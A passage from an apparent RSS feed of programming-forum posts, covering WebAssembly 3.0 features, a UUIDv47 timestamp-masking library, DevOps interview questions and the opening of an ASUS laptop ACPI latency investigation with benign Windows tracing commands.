referenced heap value, avoiding additional runtime checks that would otherwise be needed to ensure safety. This more expressive typing mechanism, including subtyping and type recursion, is also available for function references, making it possible to perform safe indirect function calls without any runtime type or bounds check, through the new <code>call_ref</code> instruction.</li> </ul> <wasm-compat></wasm-compat> <ul> <li><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/tail-call/Overview.md"><em>Tail calls.</em></a> Tail calls are a variant of function calls that immediately exit the current function, and thereby avoid taking up additional stack space. Tail calls are an important mechanism that is used in various language implementations both in user-visible ways (e.g., in functional languages) and for internal techniques (e.g., to implement stubs). Wasm tail calls are fully general and work for callees both selected statically (by function index) and dynamically (by reference or table).</li> </ul> <wasm-compat></wasm-compat> <ul> <li><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/exception-handling/Exceptions.md"><em>Exception handling.</em></a> Exceptions provide a way to locally abort execution, and are a common feature in modern programming languages. Previously, there was no efficient way to compile exception handling to Wasm, and existing compilers typically resorted to convoluted ways of implementing them by escaping to the host language, e.g., JavaScript. This was neither portable nor efficient. Wasm 3.0 hence provides native exception handling within Wasm. Exceptions are defined by declaring exception tags with associated payload data. As one would expect, an exception can be thrown, and selectively be caught by a surrounding handler, based on its tag. Exception handlers are a new form of block instruction that includes a dispatch list of tag/label pairs or catch-all labels to define where to jump when an exception occurs.</li> </ul> <wasm-compat></wasm-compat> <ul> <li><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/relaxed-simd/Overview.md"><em>Relaxed vector instructions.</em></a> Wasm 2.0 added a large set of vector (SIMD) instructions, but due to differences in hardware, some of these instructions have to do extra work on some platforms to achieve the specified semantics. In order to squeeze out maximum performance, Wasm 3.0 introduces &ldquo;relaxed&rdquo; variants of these instructions that are allowed to have implementation-dependent behavior in certain edge cases. This behavior must be selected from a pre-specified set of legal choices.</li> </ul> <wasm-compat></wasm-compat> <ul> <li><a href="https://github.com/WebAssembly/profiles/blob/main/proposals/profiles/Overview.md"><em>Deterministic profile.</em></a> To make up for the added semantic fuzziness of relaxed vector instructions, and in order to support settings that demand or need deterministic execution semantics (such as blockchains, or replayable systems), the Wasm standard now specifies a deterministic default behavior for every instruction with otherwise non-deterministic results &mdash; currently, this includes floating-point operators and their generated NaN values and the aforementioned relaxed vector instructions. Between platforms choosing to implement this deterministic execution profile, Wasm thereby is fully deterministic, reproducible, and portable.</li> </ul> <wasm-compat></wasm-compat> <ul> <li><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/annotations/Overview.md"><em>Custom annotation syntax.</em></a> Finally, the Wasm text format has been enriched with generic syntax for placing annotations in Wasm source code. Analogous to custom sections in the binary format, these annotations are not assigned any meaning by the Wasm standard itself, and can be chosen to be ignored by implementations. However, they provide a way to represent the information stored in custom sections in human-readable and writable form, and concrete annotations can be specified by downstream standards.</li> </ul> <wasm-compat></wasm-compat><p>In addition to these core features, embeddings of Wasm into JavaScript benefit from a new extension to the JS API:</p><ul> <li><a href="https://github.com/WebAssembly/js-string-builtins/blob/main/proposals/js-string-builtins/Overview.md"><em>JS string builtins.</em></a> JavaScript string values can already be passed to Wasm as externrefs. Functions from this new primitive library can be imported into a Wasm module to directly access and manipulate such external string values inside Wasm.</li> </ul> <wasm-compat></wasm-compat><p>With these new features, Wasm has much better support for compiling high-level programming languages. Enabled by this, we have seen various new languages popping up to target Wasm, such as <a href="https://github.com/google/j2cl/blob/master/docs/getting-started-j2wasm.md">Java</a>, <a href="https://dune.readthedocs.io/en/stable/wasmoo.html">OCaml</a>, <a href="https://www.scala-js.org/doc/project/webassembly.html">Scala</a>, <a href="https://kotlinlang.org/docs/wasm-overview.html">Kotlin</a>, <a href="https://spritely.institute/hoot/">Scheme</a>, or <a href="https://dart.dev/web/wasm">Dart</a>, all of which use the new GC feature.</p><p>On top of all these goodies, Wasm 3.0 also is the first version of the standard that has been produced with the new <a href="https://webassembly.org/news/2025-03-27-spectec/">SpecTec</a> tool chain. We believe that this makes for an even more reliable specification.</p><p>Wasm 3.0 is already shipping in most major web browsers, and support in stand-alone engines like Wasmtime is on track to completion as well. The <a href="https://webassembly.org/features/">Wasm feature status</a> page tracks support across engines.</p></div></div></section>]]></description><pubDate>Thu, 18 Sep 2025 02:19:51 +0530</pubDate></item><item><link>https://github.com/stateless-me/uuidv47</link><title>UUIDv47: keep v7 in your DB, emit v4 outside (SipHash-masked timestamp) (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1njebn0/uuidv47_keep_v7_in_your_db_emit_v4_outside/</guid><comments>https://www.reddit.com/r/programming/comments/1njebn0/uuidv47_keep_v7_in_your_db_emit_v4_outside/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 14 min | <a href='https://www.reddit.com/r/programming/comments/1njebn0/uuidv47_keep_v7_in_your_db_emit_v4_outside/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Hi, I’m the author of <strong>uuidv47</strong>. The idea is simple: keep <strong>UUIDv7</strong> internally for database indexing and sortability, but emit <strong>UUIDv4-looking façades</strong> externally so clients don’t see timing patterns.</p><p>How it works: the 48-bit timestamp is XOR-masked with a keyed <strong>SipHash-2-4</strong> stream derived from the UUID’s random field. The random bits are preserved, the version flips between 7 (inside) and 4 (outside), and the RFC variant is kept. The mapping is injective: <code>(ts, rand) → (encTS, rand)</code>. Decode is just <code>encTS ⊕ mask</code>, so round-trip is exact.</p><p>Security: SipHash is a PRF, so observing façades doesn’t leak the key. Wrong key = wrong timestamp. Rotation can be done with a key-ID outside the UUID.</p><p>Performance: one SipHash over 10 bytes + a couple of 48-bit loads/stores. Nanosecond overhead, header-only C89, no deps, allocation-free.</p><p>Tests: SipHash reference vectors, round-trip encode/decode, and version/variant invariants.</p><p>Curious to hear feedback!</p><p><strong>EDIT1:</strong> <strong>The Postgres extension is available.</strong></p><p>It currently supports around 95% of common use cases and index types (B-trees, BRIN, etc.), but the test coverage still needs improvement and review. The extension is functional, but it’s still in an early stage of maturity.</p><p><strong>EDIT2: The benchmark on M1(C):</strong></p><pre><code>iters=2000000, warmup=1, rounds=3[warmup] 34.89 ns/op[encode+decode] round 1: 33.80 ns/op, 29.6 Mops/s[encode+decode] round 2: 38.16 ns/op, 26.2 Mops/s[encode+decode] round 3: 33.33 ns/op, 30.0 Mops/s[warmup] 14.83 ns/op[siphash(10B)] round 1: 14.88 ns/op, 67.2 Mops/s[siphash(10B)] round 2: 15.45 ns/op, 64.7 Mops/s[siphash(10B)] round 3: 15.00 ns/op, 66.7 Mops/s== best results ==encode+decode : 33.00 ns/op (30.3 Mops/s)siphash(10B)  : 14.00 ns/op (71.4 Mops/s)</code></pre></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://opengraph.githubassets.com/0f4ff01cdbfa503a4c64ef729a6707a1aeb71147a5e29298085c60a2191a8ee5/stateless-me/uuidv47' /></section><section class='parsed-content'><div><article><h2>UUIDv47 &mdash; UUIDv7-in / UUIDv4-out (SipHash&#8209;masked timestamp)</h2><a href="https://github.com#uuidv47--uuidv7-in--uuidv4-out-siphashmasked-timestamp"></a><p><code>uuidv47</code> lets you store sortable UUIDv7 in your database while emitting a UUIDv4&#8209;looking fa&ccedil;ade at your API boundary. It XOR&#8209;masks <em>only</em> the UUIDv7 timestamp field with a keyed SipHash&#8209;2&#8209;4 stream derived from the UUID&rsquo;s own random bits. The mapping is deterministic and exactly invertible.</p><ul> <li>Header&#8209;only C (C89) &middot; zero deps</li> <li>Deterministic, invertible mapping (exact round&#8209;trip)</li> <li>RFC&#8209;compatible version/variant bits (v7 in DB, v4 on the wire)</li> <li>Key&#8209;recovery resistant (SipHash&#8209;2&#8209;4, 128&#8209;bit key)</li> <li>Full tests provided</li> <li>Optional PostgreSQL extension (UUID type + operators/opclasses)</li> </ul> <hr> <h2>Table of contents</h2><a href="https://github.com#table-of-contents"></a> <ul> <li>Why</li> <li>Quick start (C)</li> <li>Public C API</li> <li>Specification <ul> <li>UUIDv7 bit layout</li> <li>Fa&ccedil;ade mapping (v7 &harr; v4)</li> <li>SipHash message derived from random</li> <li>Invertibility</li> <li>Collision analysis</li> </ul> </li> <li>Security model</li> <li>Build, test, coverage</li> <li>PostgreSQL extension <ul> <li>Build &amp; install</li> <li>Tests</li> <li>Gotchas &amp; performance tips</li> </ul> </li> <li>Integration tips</li> <li>Performance notes</li> <li>Benchmarks (C)</li> <li>Ports in other languages</li> <li>FAQ</li> <li>License</li> </ul> <hr><p></p><h2>Why</h2><a href="https://github.com#why"></a> <ul> <li><strong>DB&#8209;friendly</strong>: UUIDv7 is time&#8209;ordered &rarr; better index locality &amp; pagination.</li> <li><strong>Externally neutral</strong>: The fa&ccedil;ade hides timing patterns and looks like v4 to clients/systems.</li> <li><strong>Secret safety</strong>: Uses a PRF (SipHash&#8209;2&#8209;4). Non&#8209;crypto hashes are not suitable when the key must not leak.</li> </ul> <hr> <h2>Quick start (C)</h2><a href="https://github.com#quick-start-c"></a><div><pre><span>#include</span> <span>#include</span> <span>"uuidv47.h"</span> <span>int</span> <span>main</span>(<span>void</span>){ <span>const</span> <span>char</span><span>*</span> <span>s</span> <span>=</span> <span>"00000000-0000-7000-8000-000000000000"</span>; <span>uuid128_t</span> <span>v7</span>; <span>if</span> (!<span>uuid_parse</span>(<span>s</span>, <span>&amp;</span><span>v7</span>)) <span>return</span> <span>1</span>; <span>uuidv47_key_t</span> <span>key</span> <span>=</span> { .<span>k0</span> <span>=</span> <span>0x0123456789abcdefULL</span>, .<span>k1</span> <span>=</span> <span>0xfedcba9876543210ULL</span> }; <span>uuid128_t</span> <span>facade</span> <span>=</span> <span>uuidv47_encode_v4facade</span>(<span>v7</span>, <span>key</span>); <span>uuid128_t</span> <span>back</span> <span>=</span> <span>uuidv47_decode_v4facade</span>(<span>facade</span>, <span>key</span>); <span>char</span> <span>a</span>[<span>37</span>], <span>b</span>[<span>37</span>], <span>c</span>[<span>37</span>]; <span>uuid_format</span>(<span>&amp;</span><span>v7</span>, <span>a</span>); <span>uuid_format</span>(<span>&amp;</span><span>facade</span>, <span>b</span>); <span>uuid_format</span>(<span>&amp;</span><span>back</span>, <span>c</span>); <span>printf</span>(<span>"v7 (DB) : %s\n"</span>, <span>a</span>); <span>printf</span>(<span>"v4 (API): %s\n"</span>, <span>b</span>); <span>printf</span>(<span>"back : %s\n"</span>, <span>c</span>); }</pre></div><p>Build &amp; run with the provided Makefile:</p><div><pre><code>make test make coverage sudo make install # installs header into $(PREFIX)/include </code></pre></div><hr> <h2>Public C API</h2><a href="https://github.com#public-c-api"></a><div><pre><span>typedef</span> <span>struct</span> { <span>uint8_t</span> <span>b</span>[<span>16</span>]; } <span>uuid128_t</span>; <span>typedef</span> <span>struct</span> { <span>uint64_t</span> <span>k0</span>, <span>k1</span>; } <span>uuidv47_key_t</span>; <span>uuid128_t</span> <span>uuidv47_encode_v4facade</span>(<span>uuid128_t</span> <span>v7</span>, <span>uuidv47_key_t</span> <span>key</span>); <span>uuid128_t</span> <span>uuidv47_decode_v4facade</span>(<span>uuid128_t</span> <span>v4_facade</span>, <span>uuidv47_key_t</span> <span>key</span>); <span>int</span> <span>uuid_version</span>(<span>const</span> <span>uuid128_t</span><span>*</span> <span>u</span>); <span>void</span> <span>set_version</span>(<span>uuid128_t</span><span>*</span> <span>u</span>, <span>int</span> <span>ver</span>); <span>void</span> <span>set_variant_rfc4122</span>(<span>uuid128_t</span><span>*</span> <span>u</span>); <span>bool</span> <span>uuid_parse</span> (<span>const</span> <span>char</span><span>*</span> <span>str</span>, <span>uuid128_t</span><span>*</span> <span>out</span>); <span>void</span> <span>uuid_format</span>(<span>const</span> <span>uuid128_t</span><span>*</span> <span>u</span>, <span>char</span> <span>out</span>[<span>37</span>]);</pre></div><hr><p></p><h2>Specification</h2><a href="https://github.com#specification"></a> <h3>UUIDv7 bit layout</h3><a href="https://github.com#uuidv7-bit-layout"></a> <ul> <li><strong>ts_ms_be</strong>: 48&#8209;bit big&#8209;endian timestamp</li> <li><strong>ver</strong>: high nibble of byte 6 = 0x7 (v7) or 0x4 (fa&ccedil;ade)</li> <li><strong>rand_a</strong>: 12 random bits</li> <li><strong>var</strong>: RFC variant (0b10)</li> <li><strong>rand_b</strong>: 62 random bits</li> </ul><p></p><h3>Fa&ccedil;ade mapping</h3><a href="https://github.com#fa%C3%A7ade-mapping"></a> <ul> <li><strong>Encode</strong>: <code>ts48 ^ mask48(R)</code>, then set version = 4</li> <li><strong>Decode</strong>: <code>encTS ^ mask48(R)</code>, then set version = 7</li> <li>Random bits remain unchanged.</li> </ul> <h3>SipHash message</h3><a href="https://github.com#siphash-message"></a><p>10 bytes derived from the v7 random field:</p><div><pre><code>msg[0] = (byte6 &amp; 0x0F) msg[1] = byte7 msg[2] = (byte8 &amp; 0x3F) msg[3..9] = bytes9..15 </code></pre></div><h3>Invertibility</h3><a href="https://github.com#invertibility"></a><p>The mask is XOR with a keyed PRF &rarr; perfectly invertible when the key is known.</p><h3>Collision analysis</h3><a href="https://github.com#collision-analysis"></a><p>Mapping is injective; collisions reduce to duplicate randoms within the same ms.</p><hr> <h2>Security model</h2><a href="https://github.com#security-model"></a> <ul> <li><strong>Goal</strong>: Secret key unrecoverable even with chosen inputs.</li> <li><strong>Achieved</strong>: SipHash&#8209;2&#8209;4 is a keyed PRF.</li> <li><strong>Keys</strong>: 128&#8209;bit. Recommend deriving via HKDF.</li> <li><strong>Rotation</strong>: Store a small key ID alongside UUIDs (out&#8209;of&#8209;band).</li> </ul> <hr><p></p><h2>Build, test, coverage</h2><a href="https://github.com#build-test-coverage"></a><div><pre><code>make test make coverage make debug sudo make install # optional microbench make bench &amp;&amp; ./bench </code></pre></div><hr> <h2>PostgreSQL extension</h2><a href="https://github.com#postgresql-extension"></a><p>This repo includes an optional Postgres extension that defines a <code>uuid47</code> base type, casts to/from core <code>uuid</code>, operators, B&#8209;tree/hash opclasses, and a BRIN (minmax&#8209;multi) distance support function.</p><h3>Build &amp; install</h3><a href="https://github.com#build--install"></a><div><pre><code># From repo root (uses PGXS via pg_config) make pginstall </code></pre></div><p>Enable in a database:</p><div><pre>CREATE EXTENSION uuid47; <span><span>--</span> installs type and functions</span> <span><span>--</span> (If you installed into a custom schema, add it to search_path.)</span></pre></div><h3>Tests</h3><a href="https://github.com#tests"></a><p>Run the SQL test suite end&#8209;to&#8209;end:</p><div><pre><code>make pgtest PG_CONFIG=/opt/homebrew/opt/postgresql@17/bin/pg_config PSQL="/opt/homebrew/opt/postgresql@17/bin/psql" DBNAME=postgres </code></pre></div><h3>Gotchas &amp; performance tips</h3><a href="https://github.com#gotchas--performance-tips"></a> <ul> <li><strong>Use the native column type</strong>: store <code>uuid47_generate()</code> into a <code>uuid47</code> column. Inserting into <code>uuid</code> triggers an assignment cast every row and can be ~2&ndash;3 &micro;s/row slower.</li> <li><strong>Type alignment</strong>: <code>uuid47</code> uses <code>ALIGNMENT = int4</code> (like core <code>uuid</code>) for better tuple formation speed.</li> <li><strong>Key GUC</strong>: some transforms (e.g., fa&ccedil;ade output) require a session key:<div><pre><span>SET</span> <span>uuid47</span>.<span>key</span> <span>=</span> <span><span>'</span>0011223344556677:8899aabbccddeeff<span>'</span></span>;</pre></div>Parse happens once via a GUC assign hook and is cached per backend.</li> </ul> <hr><p></p><h2>Integration tips</h2><a href="https://github.com#integration-tips"></a> <ul> <li>Do encode/decode at the API boundary; keep v7 in storage.</li> <li>For sharding/partitioning, hash the v4 fa&ccedil;ade (e.g., xxh3 or SipHash).</li> <li>Keep your key material in a KMS; include a small key ID with each row.</li> </ul> <hr> <h2>Performance notes</h2><a href="https://github.com#performance-notes"></a> <ul> <li>SipHash&#8209;2&#8209;4 on a 10&#8209;byte message is extremely fast and allocation&#8209;free.</li> <li>The provided implementation avoids per&#8209;row GUC parsing and minimizes copies.</li> <li>Monotonic generator uses per&#8209;backend state; ordering is stable within a session.</li> </ul> <hr><p></p><h2>Benchmarks (C)</h2><a href="https://github.com#benchmarks-c"></a><p><strong>Command:</strong> <code>./bench</code> (2,000,000 iters, 1 warmup + 3 rounds)</p><p><strong>Example (Apple M&#8209;series):</strong></p><div><pre>iters=2000000, warmup=1, rounds=3 [warmup] 34.89 ns/op [encode+decode] round 1: 33.80 ns/op, 29.6 Mops/s [encode+decode] round 2: 38.16 ns/op, 26.2 Mops/s [encode+decode] round 3: 33.33 ns/op, 30.0 Mops/s [warmup] 14.83 ns/op [siphash(10B)] round 1: 14.88 ns/op, 67.2 Mops/s [siphash(10B)] round 2: 15.45 ns/op, 64.7 Mops/s [siphash(10B)] round 3: 15.00 ns/op, 66.7 Mops/s == best results == encode+decode <span>:</span> 33.00 ns/op (30.3 Mops/s) siphash(10B) <span>:</span> 14.00 ns/op (71.4 Mops/s)</pre></div><p>What it measures</p><ul> <li><code>encode+decode</code>: full v7 &rarr; fa&ccedil;ade &rarr; v7 round&#8209;trip.</li> <li><code>siphash(10B)</code>: SipHash&#8209;2&#8209;4 on the 10&#8209;byte mask message.</li> </ul> <blockquote><p>Build with <code>-O3 -march=native</code> for best results.</p></blockquote> <hr> <h2>Ports in other languages</h2><a href="https://github.com#ports-in-other-languages"></a> <ul> <li><strong>Go:</strong> <a href="https://github.com/n2p5/uuid47">n2p5/uuid47</a> &mdash; Go port of UUIDv47</li> <li><strong>JavaScript:</strong> <a href="https://github.com/sh1kxrv/node_uuidv47">sh1kxrv/node_uuidv47</a> &mdash; JavaScript port of UUIDv47 with native bindings</li> </ul> <hr><p></p><h2>FAQ</h2><a href="https://github.com#faq"></a><p><strong>Q: Why not xxHash with a secret?</strong><br> A: Not a PRF; secret can leak. Use SipHash.</p><p><strong>Q: Is the fa&ccedil;ade indistinguishable from v4?</strong><br> A: Version/variant bits are v4; variable bits are uniformly distributed under the PRF.</p><hr> <h2>License</h2><a href="https://github.com#license"></a><p>MIT, Copyright (c) 2025 Stateless Limited</p></article></div></section>]]></description><pubDate>Wed, 17 Sep 2025 19:44:47 +0530</pubDate></item><item><link>https://www.youtube.com/watch?v=apREl0KmTdQ</link><title>Software Performance: Avoiding Slow Code, Myths  Sane Approaches - Casey Muratori | The Marco Show (youtube.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nje6fk/software_performance_avoiding_slow_code_myths/</guid><comments>https://www.reddit.com/r/programming/comments/1nje6fk/software_performance_avoiding_slow_code_myths/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nje6fk/software_performance_avoiding_slow_code_myths/'>Post permalink</a></p></section><section class='embedded-media'><iframe width="356" height="200" src="https://www.youtube.com/embed/apREl0KmTdQ?feature=oembed&enablejsapi=1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen title="Software Performance: Avoiding Slow Code, Myths &amp; Sane Approaches – Casey Muratori | The Marco Show"></iframe></section>]]></description><pubDate>Wed, 17 Sep 2025 19:39:01 +0530</pubDate></item><item><link>https://medium.com/mind-meets-machine/senior-devops-engineer-interview-at-uber-9a7237b3cc34?sk=09327ee4743c924974ce2000eb0909c9</link><title>Senior DevOps Engineer Interview at Uber.. (medium.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nj9urv/senior_devops_engineer_interview_at_uber/</guid><comments>https://www.reddit.com/r/programming/comments/1nj9urv/senior_devops_engineer_interview_at_uber/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nj9urv/senior_devops_engineer_interview_at_uber/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><article><div><h2>Here is the full interview simulation guide and tips to crack it.</h2><figure><div><p><span>Press enter or click to view image in full size</span></p></div></figure><p>Round 1 &ndash; Core Systems, Linux, Cloud &amp; Kubernetes<br>1. How would you design zero-downtime rollouts for 100+ microservices running on EKS?<br>2. Walk me through what kube-proxy does when IPVS rules vanish mid-traffic.<br>3. Explain your approach to debugging DNS resolution inside pods when CoreDNS itself looks healthy.<br>4. Terraform apply failed mid-way. Half the infra is live, half broken. Walk me through recovery.<br>5. How would you secure secrets management at scale when engineers need fast access but compliance demands audits?</p><p>Round 2 &ndash; RCA, Reliability &amp; Fire Drills<br>1. Kafka consumer lag shoots up after a canary rollout, but CPU/memory metrics are normal. Where do you start?<br>2. A region fails over successfully, but P99 latency doubles across clients. What did you miss?<br>3. HPA is scaling pods, but they remain Pending even with node capacity. Cluster vs scheduler vs CNI, how do you debug?<br>4. etcd corruption detected in a multi-master control plane. Walk through recovery without full downtime.<br>5. CI/CD pipeline secrets leaked through logs. What&rsquo;s your incident response, and how do you prevent it in the future?</p></div></article><div class="gallery"><p><img src="https://miro.medium.com/v2/resize:fill:64:64/1*5Uc9ZGkfouCJTEVWqM6DDw.png"></p></div></section>]]></description><pubDate>Wed, 17 Sep 2025 16:23:35 +0530</pubDate></item><item><link>https://github.com/Zephkek/Asus-ROG-Aml-Deep-Dive</link><title>ASUS Gaming Laptops Have Been Broken Since 2021: A Deep Dive (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niy72f/asus_gaming_laptops_have_been_broken_since_2021_a/</guid><comments>https://www.reddit.com/r/programming/comments/1niy72f/asus_gaming_laptops_have_been_broken_since_2021_a/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 44 min | <a href='https://www.reddit.com/r/programming/comments/1niy72f/asus_gaming_laptops_have_been_broken_since_2021_a/'>Post permalink</a></p></section><section class='preview-image'><img src='https://opengraph.githubassets.com/8dd42c41ba8c3a3157db998bd4f07bc05a44da09f0745800dc79c69bc5143318/Zephkek/Asus-ROG-Aml-Deep-Dive' /></section><section class='parsed-content'><div><article><h2>The ASUS Gaming Laptop ACPI Firmware Bug: A Deep Technical Investigation</h2><a href="https://github.com#the-asus-gaming-laptop-acpi-firmware-bug-a-deep-technical-investigation"></a><p></p><h2>If You're Here, You Know The Pain</h2><a href="https://github.com#if-youre-here-you-know-the-pain"></a><p>You own a high-end ASUS ROG laptop perhaps a Strix, Scar, or Zephyrus. It's specifications are impressive: an RTX 30/40 series GPU, a top-tier Intel processor, and plenty of RAM. Yet, it stutters during basic tasks like watching a YouTube video, audio crackles and pops on Discord calls, the mouse cursor freezes for a split second, just long enough to be infuriating.</p><p>You've likely tried all the conventional fixes:</p><ul> <li>Updating every driver imaginable, multiple times.</li> <li>Performing a "clean" reinstallation of Windows.</li> <li>Disabling every conceivable power-saving option.</li> <li>Manually tweaking processor interrupt affinities.</li> <li>Following convoluted multi-step guides from Reddit threads.</li> <li>Even installing Linux, only to find the problem persists.</li> </ul><p>If none of that worked, it's because the issue isn't with the operating system or a driver. The problem is far deeper, embedded in the machine's firmware, the BIOS.</p><h2>Initial Symptoms and Measurement</h2><a href="https://github.com#initial-symptoms-and-measurement"></a><p></p><h3>The Pattern Emerges</h3><a href="https://github.com#the-pattern-emerges"></a><p>The first tool in any performance investigator's toolkit for these symptoms is LatencyMon. It acts as a canary in the coal mine for system-wide latency issues. On an affected ASUS Zephyrus M16, the results are immediate and damning:</p><div><pre><code>CONCLUSION Your system appears to be having trouble handling real-time audio and other tasks. You are likely to experience buffer underruns appearing as drop outs, clicks or pops. HIGHEST MEASURED INTERRUPT TO PROCESS LATENCY Highest measured interrupt to process latency (&mu;s): 65,816.60 Average measured interrupt to process latency (&mu;s): 23.29 HIGHEST REPORTED ISR ROUTINE EXECUTION TIME Highest ISR routine execution time (&mu;s): 536.80 Driver with highest ISR routine execution time: ACPI.sys HIGHEST REPORTED DPC ROUTINE EXECUTION TIME Highest DPC routine execution time (&mu;s): 5,998.83 Driver with highest DPC routine execution time: ACPI.sys </code></pre></div><p>The data clearly implicates <code>ACPI.sys</code>. However, the per-CPU data reveals a more specific pattern:</p><div><pre><code>CPU 0 Interrupt cycle time (s): 208.470124 CPU 0 ISR highest execution time (&mu;s): 536.804674 CPU 0 DPC highest execution time (&mu;s): 5,998.834725 CPU 0 DPC total execution time (s): 90.558238 </code></pre></div><p>CPU 0 is taking the brunt of the impact, spending over 90 seconds processing interrupts while other cores remain largely unaffected. This isn't a failure of load balancing; it's a process locked to a single core.</p><p>A similar test on a Scar 15 from 2022 shows the exact same culprit: high DPC latency originating from <code>ACPI.sys</code>.</p><a href="https://private-user-images.githubusercontent.com/76183331/490271011-fdf6f26a-dda8-4561-82c7-349fc8c298ab.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgzNDEyNTksIm5iZiI6MTc1ODM0MDk1OSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEwMTEtZmRmNmYyNmEtZGRhOC00NTYxLTgyYzctMzQ5ZmM4YzI5OGFiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MjAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTIwVDA0MDIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTBiZmFjZDkzZDMyMjhmM2JiYzhjYTk4ZGE0NmVmZWFlYjQ3YmU1ZmZhZmJiZTc0Yzk2N2E2NGU4ODBiOGMxNTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.2S831yTrhzSrgkBg4duTiloCBRTyFdtG4zHHO9t2mz0"><img width="974" height="511" alt="latencymon" src="https://private-user-images.githubusercontent.com/76183331/490271011-fdf6f26a-dda8-4561-82c7-349fc8c298ab.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgzNDEyNTksIm5iZiI6MTc1ODM0MDk1OSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzEwMTEtZmRmNmYyNmEtZGRhOC00NTYxLTgyYzctMzQ5ZmM4YzI5OGFiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MjAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTIwVDA0MDIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTBiZmFjZDkzZDMyMjhmM2JiYzhjYTk4ZGE0NmVmZWFlYjQ3YmU1ZmZhZmJiZTc0Yzk2N2E2NGU4ODBiOGMxNTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.2S831yTrhzSrgkBg4duTiloCBRTyFdtG4zHHO9t2mz0"></a><p>It's easy to blame a Windows driver, but <code>ACPI.sys</code> is not a typical driver. It primarily functions as an interpreter for ACPI Machine Language (AML), the code provided by the laptop's firmware (BIOS). If <code>ACPI.sys</code> is slow, it's because the firmware is feeding it inefficient or flawed AML code to execute. These slowdowns are often triggered by General Purpose Events (GPEs) and traffic from the Embedded Controller (EC). To find the true source, we must dig deeper.</p><h2>Capturing the Problem in More Detail: ETW Tracing</h2><a href="https://github.com#capturing-the-problem-in-more-detail-etw-tracing"></a><p></p><h3>Setting Up Advanced ACPI Tracing</h3><a href="https://github.com#setting-up-advanced-acpi-tracing"></a><p>To understand what <code>ACPI.sys</code> is doing during these latency spikes, we can use Event Tracing for Windows (ETW) to capture detailed logs from the ACPI providers.</p><div><pre><span><span>#</span> Find the relevant ACPI ETW providers</span> logman query providers <span>|</span> findstr <span>/</span>i acpi <span><span>#</span> This returns two key providers:</span> <span><span>#</span> Microsoft-Windows-Kernel-Acpi {C514638F-7723-485B-BCFC-96565D735D4A}</span> <span><span>#</span> Microsoft-ACPI-Provider {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}</span> <span><span>#</span> Start a comprehensive trace session</span> logman start ACPITrace <span>-</span>p {DAB01D4D<span>-</span>2D48<span>-</span><span>477D</span><span>-</span>B1C3<span>-</span>DAAD0CE6F06B} <span>0xFFFFFFFF</span> <span>5</span> <span>-</span>o C:\Temp\acpi.etl <span>-</span>ets logman update ACPITrace <span>-</span>p {C514638F<span>-</span><span>7723</span><span>-</span>485B<span>-</span>BCFC<span>-</span>96565D735D4A} <span>0xFFFFFFFF</span> <span>5</span> <span>-</span>ets <span><span>#</span> Then once we're done we can stop the trace and check the etl file and save the data in csv format aswell.</span> logman stop ACPITrace <span>-</span>ets tracerpt C:\Temp\acpi.etl <span>-</span>o C:\Temp\acpi_events.csv <span>-</span>of CSV</pre></div><h3>An Unexpected Discovery</h3><a href="https://github.com#an-unexpected-discovery"></a><p>Analyzing the resulting trace file in the Windows Performance Analyzer reveals a crucial insight. The spikes aren't random; they are periodic, occurring like clockwork every 30 to 60 seconds.</p><a 